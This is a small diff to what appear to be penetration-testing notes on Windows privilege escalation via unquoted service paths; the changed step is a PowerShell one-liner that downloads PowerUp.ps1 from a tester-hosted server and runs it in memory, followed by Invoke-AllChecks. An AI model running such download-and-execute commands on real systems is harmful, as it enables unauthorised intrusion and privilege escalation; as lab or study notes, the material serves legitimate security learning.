@@ -18,7 +18,7 @@ Unquoted Service Path: See if you can (M)odify designated folder
 
 1. Create HTTP Server to host PowerUp.ps1
 
-2. iex (New-Object Net.WebClient).DownloadString('http://10.10.15.3/PowerUp.ps1')
+2. iex (New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1')
  
 3. Invoke-AllChecks
 
